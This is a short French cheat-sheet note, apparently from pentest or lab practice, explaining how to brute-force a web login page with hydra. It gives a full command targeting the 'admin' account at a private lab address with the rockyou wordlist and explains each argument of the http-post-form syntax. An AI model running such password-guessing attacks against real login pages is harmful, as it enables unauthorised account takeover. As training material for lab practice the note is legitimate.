Pour brute force une page login avec hydra :
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.19 http-post-form '/login.php:username=^USER^&password=^PASS^:S=command'

```
-l : nom d'utilisateur ici admin
-P : fichier contenant des MdP
http-post-form : mode d'envoit du mdp
'/login.php:username=^USER^&password=^PASS^:S=command' : toujours 3 partie séparé par ':' :
	page : données envoyées : données certifiant que c'est OK